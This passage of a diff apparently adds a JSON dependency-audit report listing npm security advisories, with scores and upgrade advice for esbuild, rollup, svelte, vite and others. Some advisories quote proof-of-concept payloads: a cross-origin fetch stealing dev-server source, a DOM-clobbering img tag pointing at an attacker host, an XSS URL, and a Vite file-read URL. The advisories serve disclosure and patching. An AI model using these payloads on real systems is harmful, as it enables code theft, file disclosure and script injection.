+      "details": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "cwes": [
+        {
+          "id": "CWE-346",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-02-10T17:48:07Z",
+        "modifiedDate": "2025-02-10T17:48:08Z",
+        "daysSincePublished": 310
+      },
+      "affected": {
+        "package": "esbuild",
+        "version": "0.18.20",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "0.18.20",
+        "fixedIn": "0.25.0",
+        "recommendation": "Upgrade to 0.25.0 or later",
+        "fixAvailableSince": "2025-02-10T17:48:08.000Z",
+        "daysSinceFix": 310,
+        "monthsSinceFix": 10,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/evanw/esbuild"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-mh29-5h37-fv8m",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-64718"
+      ],
+      "summary": "js-yaml has prototype pollution in merge (<<)",
+      "details": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+      "cwes": [
+        {
+          "id": "CWE-1321",
+          "name": "Improperly Controlled Modification of Object Prototype Attributes (Prototype Pollution)"
+        }
+      ],
+      "age": {
+        "age": "Recent (< 6 months)",
+        "isRecent": true,
+        "publishedDate": "2025-11-14T14:29:48Z",
+        "modifiedDate": "2025-11-17T15:20:43Z",
+        "daysSincePublished": 33
+      },
+      "affected": {
+        "package": "js-yaml",
+        "version": "4.1.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.1.0",
+        "fixedIn": "4.1.1",
+        "recommendation": "Upgrade to 4.1.1 or later",
+        "fixAvailableSince": "2025-11-17T15:20:43.000Z",
+        "daysSinceFix": 30,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64718"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodeca/js-yaml"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-952p-6rrq-rcjv",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-4067"
+      ],
+      "summary": "Regular Expression Denial of Service (ReDoS) in micromatch",
+      "details": "The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-05-14T18:30:54Z",
+        "modifiedDate": "2024-08-28T13:12:26Z",
+        "daysSincePublished": 582
+      },
+      "affected": {
+        "package": "micromatch",
+        "version": "4.0.5",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.0.5",
+        "fixedIn": "4.0.8",
+        "recommendation": "Upgrade to 4.0.8 or later",
+        "fixAvailableSince": "2024-08-28T13:12:26.000Z",
+        "daysSinceFix": 476,
+        "monthsSinceFix": 15,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4067"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/issues/243"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/pull/247"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/pull/266"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://advisory.checkmarx.net/advisory/CVE-2024-4067"
+        },
+        {
+          "type": "WEB",
+          "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4067"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/micromatch/micromatch"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/releases/tag/4.0.8"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-mwcw-c2x4-8c55",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-55565"
+      ],
+      "summary": "Predictable results in nanoid generation when given non-integer values",
+      "details": "When nanoid is called with a fractional value, there were a number of undesirable effects:\n\n1. in browser and non-secure, the code infinite loops on while (size--)\n2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled\n3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error\n\nVersion 3.3.8 and 5.0.9 are fixed.",
+      "cwes": [
+        {
+          "id": "CWE-835",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-12-09T03:30:59Z",
+        "modifiedDate": "2025-11-04T16:54:54Z",
+        "daysSincePublished": 373
+      },
+      "affected": {
+        "package": "nanoid",
+        "version": "3.3.6",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.3.6",
+        "fixedIn": "5.0.9",
+        "recommendation": "Upgrade to 5.0.9 or later",
+        "fixAvailableSince": "2025-11-04T16:54:54.000Z",
+        "daysSinceFix": 43,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-55565"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ai/nanoid/pull/510"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/ai/nanoid"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ai/nanoid/compare/3.3.7...3.3.8"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ai/nanoid/releases/tag/5.0.9"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2025/01/msg00006.html"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-7fh5-64p2-3v2j",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2023-44270"
+      ],
+      "summary": "PostCSS line return parsing error",
+      "details": "An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\\r` discrepancies, as demonstrated by `@font-face{ font:(\\r/*);}` in a rule.\n\nThis vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment.",
+      "cwes": [
+        {
+          "id": "CWE-144",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-74",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-09-30T00:31:10Z",
+        "modifiedDate": "2025-11-04T16:45:01Z",
+        "daysSincePublished": 809
+      },
+      "affected": {
+        "package": "postcss",
+        "version": "8.4.28",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "8.4.28",
+        "fixedIn": "8.4.31",
+        "recommendation": "Upgrade to 8.4.31 or later",
+        "fixAvailableSince": "2025-11-04T16:45:01.000Z",
+        "daysSinceFix": 43,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-44270"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/github/advisory-database/issues/2820"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/postcss/postcss/commit/58cc860b4c1707510c9cd1bc1fa30b423a9ad6c5"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/postcss/postcss"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/postcss/postcss/blob/main/lib/tokenize.js#L25"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/postcss/postcss/releases/tag/8.4.31"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-gcx4-mw62-g8wm",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:H/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-47068"
+      ],
+      "summary": "DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS",
+      "details": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nIt's worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n#### Gadget found in `rollup`\n\nWe have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185\n\nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.\n\n### PoC\n\nConsidering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.\n\n```\nvar s = document.createElement('script')\ns.src = import.meta.url + 'extra.js'\ndocument.head.append(s)\n```\n\nThe output `bundle.js` is shown in the following code snippet.\n\n```\n'use strict';\n\nvar _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;\nvar s = document.createElement('script');\ns.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && False && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';\ndocument.head.append(s);\n```\n\nAdding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>rollup Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script type=\"module\" crossorigin src=\"bundle.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.\n\n### Patch\n\nPatching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.\n\n```\nconst getRelativeUrlFromDocument = (relativePath: string, umd = false) =>\n\tgetResolveUrl(\n\t\t`'${escapeId(relativePath)}', ${\n\t\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t\t}document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`\n\t);\n```\n\n```\nconst getUrlFromDocument = (chunkId: string, umd = false) =>\n\t`${\n\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t}(${DOCUMENT_CURRENT_SCRIPT} && ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &&${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(\n\t\tchunkId\n\t)}', document.baseURI).href)`;\n```\n",
+      "cwes": [
+        {
+          "id": "CWE-79",
+          "name": "Cross-Site Scripting (XSS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-09-23T22:11:02Z",
+        "modifiedDate": "2024-09-26T21:11:53Z",
+        "daysSincePublished": 449
+      },
+      "affected": {
+        "package": "rollup",
+        "version": "3.28.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.28.1",
+        "fixedIn": "3.29.5",
+        "recommendation": "Upgrade to 3.29.5 or later",
+        "fixAvailableSince": "2024-09-26T21:11:53.000Z",
+        "daysSinceFix": 446,
+        "monthsSinceFix": 14,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47068"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/rollup/rollup"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-c2qf-rxjj-qqgw",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2022-25883"
+      ],
+      "summary": "semver vulnerable to Regular Expression Denial of Service",
+      "details": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-06-21T06:30:28Z",
+        "modifiedDate": "2024-12-06T20:34:31Z",
+        "daysSincePublished": 910
+      },
+      "affected": {
+        "package": "semver",
+        "version": "7.3.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "7.3.8",
+        "fixedIn": "7.5.2",
+        "recommendation": "Upgrade to 7.5.2 or later",
+        "fixAvailableSince": "2024-12-06T20:34:31.000Z",
+        "daysSinceFix": 375,
+        "monthsSinceFix": 12,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25883"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/pull/564"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/pull/585"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/pull/593"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/commit/2f8fd41487acf380194579ecb6f8b1bbfe116be0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/commit/717534ee353682f3bcf33e60a8af4292626d4441"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/commit/928e56d21150da0413a3333a3148b20e741a920c"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/npm/node-semver"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/classes/range.js#L97-L104"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/classes/range.js%23L97-L104"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js#L138"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js#L160"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js%23L138"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js%23L160"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20241025-0004"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JS-SEMVER-3247795"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-8266-84wp-wv5c",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-45047"
+      ],
+      "summary": "Svelte has a potential mXSS vulnerability due to improper HTML escaping",
+      "details": "### Summary\n\nA potential XSS vulnerability exists in Svelte for versions prior to 4.2.19.\n\n### Details\n\nSvelte improperly escapes HTML on server-side rendering. It converts strings according to the following rules:\n\n- If the string is an attribute value:\n    - `\"` -> `&quot;`\n    - `&` -> `&amp;`\n    - Other characters -> No conversion\n- Otherwise:\n    - `<` -> `&lt;`\n    - `&` -> `&amp;`\n    - Other characters -> No conversion\n\nThe assumption is that attributes will always stay as such, but in some situation the final DOM tree rendered on browsers is different from what Svelte expects on server-side rendering. This may be leveraged to perform XSS attacks. More specifically, this can occur when injecting malicious content into an attribute within a `<noscript>` tag.\n\n### PoC\n\nA vulnerable page (`+page.svelte`):\n```html\n<script>\nimport { page } from \"$app/stores\"\n\n// user input\nlet href = $page.url.searchParams.get(\"href\") ?? \"https://example.com\";\n</script>\n\n<noscript>\n  <a href={href}>test</a>\n</noscript>\n```\n\nIf a user accesses the following URL,\n```\nhttp://localhost:4173/?href=</noscript><script>alert(123)</script>\n```\nthen, `alert(123)` will be executed.\n\n### Impact\n\nXSS, when using an attribute within a noscript tag",
+      "cwes": [
+        {
+          "id": "CWE-79",
+          "name": "Cross-Site Scripting (XSS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-08-30T16:49:10Z",
+        "modifiedDate": "2024-08-30T20:01:23Z",
+        "daysSincePublished": 474
+      },
+      "affected": {
+        "package": "svelte",
+        "version": "3.50.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.50.1",
+        "fixedIn": "4.2.19",
+        "recommendation": "Upgrade to 4.2.19 or later",
+        "fixAvailableSince": "2024-08-30T20:01:23.000Z",
+        "daysSinceFix": 474,
+        "monthsSinceFix": 15,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/sveltejs/svelte/security/advisories/GHSA-8266-84wp-wv5c"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45047"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/sveltejs/svelte/commit/83e96e044deb5ecbae2af361ae9e31d3e1ac43a3"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/sveltejs/svelte"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-4r4m-qw57-chr8",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-31125"
+      ],
+      "summary": "Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query",
+      "details": "### Summary\n\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\nOnly apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n\n- base64 encoded content of non-allowed files is exposed using `?inline&import` (originally reported as `?import&?inline=1.wasm?init`)\n- content of non-allowed files is exposed using `?raw?import`\n\n`/@fs/` isn't needed to reproduce the issue for files inside the project root.\n\n### PoC\n\nOriginal report (check details above for simplified cases):\n\nThe ?import&?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice\n```\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n```\n\nExample full URL `http://localhost:5173/@fs/C:/windows/win.ini?import&?inline=1.wasm?init`",
+      "cwes": [
+        {
+          "id": "CWE-200",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-284",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-03-31T17:31:54Z",
+        "modifiedDate": "2025-03-31T23:32:54Z",
+        "daysSincePublished": 261
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "6.2.4",
+        "recommendation": "Upgrade to 6.2.4 or later",
+        "fixAvailableSince": "2025-03-31T23:32:54.000Z",
+        "daysSinceFix": 260,
+        "monthsSinceFix": 8,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-31125"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-64vr-g452-qvp3",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-45812"
+      ],
+      "summary": "Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS",
+      "details": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in Vite when building scripts to `cjs`/`iife`/`umd` output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.\n\nNote that, we have identified similar security issues in Webpack: https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986\n\n### Details\n\n**Backgrounds**\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n**Gadgets found in Vite**\n\nWe have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the 